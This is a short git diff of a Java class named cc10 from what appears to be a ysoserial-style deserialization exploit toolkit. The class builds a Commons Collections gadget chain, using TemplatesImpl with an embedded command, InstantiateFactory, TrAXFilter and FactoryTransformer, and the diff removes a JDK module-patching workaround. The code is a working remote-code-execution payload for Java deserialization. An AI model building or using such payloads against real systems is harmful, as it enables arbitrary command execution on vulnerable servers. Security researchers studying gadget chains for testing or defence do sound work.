@@ -25,10 +25,6 @@ public class cc10 implements ObjectPayload<Object> {
 
         templates = Gadgets.createTemplatesImpl(command);
 
-        Class<?> aClass = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
-        patchModule(cc4_17.class,aClass);
-
-
         // 使用 InstantiateFactory 代替 InstantiateTransformer
         InstantiateFactory instantiateFactory = new InstantiateFactory(TrAXFilter.class, new Class[]{Templates.class}, new Object[]{templates});
         FactoryTransformer factoryTransformer = new FactoryTransformer((Factory) instantiateFactory);
